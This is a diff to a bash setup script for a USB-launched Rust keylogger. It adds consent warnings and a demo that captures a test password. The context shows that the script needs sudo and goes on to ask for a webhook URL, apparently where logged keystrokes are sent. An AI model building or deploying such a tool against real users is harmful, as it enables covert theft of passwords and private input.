@@ -23,8 +23,28 @@ echo "=========================================="
 echo "  Rust Keylogger USB Auto-run Script"
 echo "=========================================="
 echo ""
-echo "⚠️  WARNING: This will activate a keylogger!"
-echo "This tool is for educational/authorized security testing only."
+echo "⚠️  ⚠️  ⚠️  WARNING ⚠️  ⚠️  ⚠️"
+echo ""
+echo "This script will activate a KEYLOGGER that records"
+echo "ALL keystrokes from ALL keyboards on this system!"
+echo ""
+echo "This tool is for EDUCATIONAL and AUTHORIZED"
+echo "security testing purposes ONLY."
+echo ""
+echo "By continuing, you acknowledge that:"
+echo "  • You own this system or have explicit permission"
+echo "  • Unauthorized keylogging may be illegal"
+echo "  • You understand the privacy implications"
+echo ""
+read -p "Do you want to continue? (yes/no): " CONFIRM
+echo ""
+
+if [ "$CONFIRM" != "yes" ] && [ "$CONFIRM" != "YES" ] && [ "$CONFIRM" != "y" ]; then
+    echo "❌ Operation cancelled by user."
+    exit 0
+fi
+
+echo "✅ User confirmed. Proceeding with setup..."
 echo ""
 
 # Get the directory where this script is located (USB drive root)
@@ -74,6 +94,45 @@ fi
 
 echo "✅ Running with sudo privileges"
 echo ""
+
+# Educational demonstration: Show keylogger effects safely
+echo "=========================================="
+echo "  Educational Demonstration"
+echo "=========================================="
+echo ""
+echo "To demonstrate how a keylogger captures keystrokes,"
+echo "we'll ask you to enter a TEST password below."
+echo ""
+echo "⚠️  IMPORTANT SAFETY NOTES:"
+echo "  • DO NOT use your real password!"
+echo "  • Use a fake password like 'test123' or 'demo456'"
+echo "  • This is just to show you how keyloggers work"
+echo "  • All keystrokes will be logged to demonstrate the tool"
+echo ""
+read -p "Do you want to see the demonstration? (yes/no): " DEMO_CONFIRM
+echo ""
+
+if [ "$DEMO_CONFIRM" = "yes" ] || [ "$DEMO_CONFIRM" = "YES" ] || [ "$DEMO_CONFIRM" = "y" ]; then
+    echo "📝 Please enter a FAKE/TEST password to see how it's captured:"
+    read -sp "Test Password: " TEST_PASSWORD
+    echo ""
+    echo ""
+    echo "✅ Demonstration complete!"
+    echo "   The keylogger would have captured: $TEST_PASSWORD"
+    echo "   (This was just a demonstration - the keylogger isn't running yet)"
+    echo ""
+    echo "⚠️  Remember: Real keyloggers capture passwords without any prompts!"
+    echo "   This is why you should:"
+    echo "   • Only use keyloggers on systems you own"
+    echo "   • Be aware of physical security"
+    echo "   • Use two-factor authentication when possible"
+    echo ""
+    read -p "Press Enter to continue with actual keylogger setup..."
+    echo ""
+else
+    echo "ℹ️  Skipping demonstration. Proceeding to setup..."
+    echo ""
+fi
 
 # Prompt for webhook URL
 echo "🌐 Webhook Configuration"
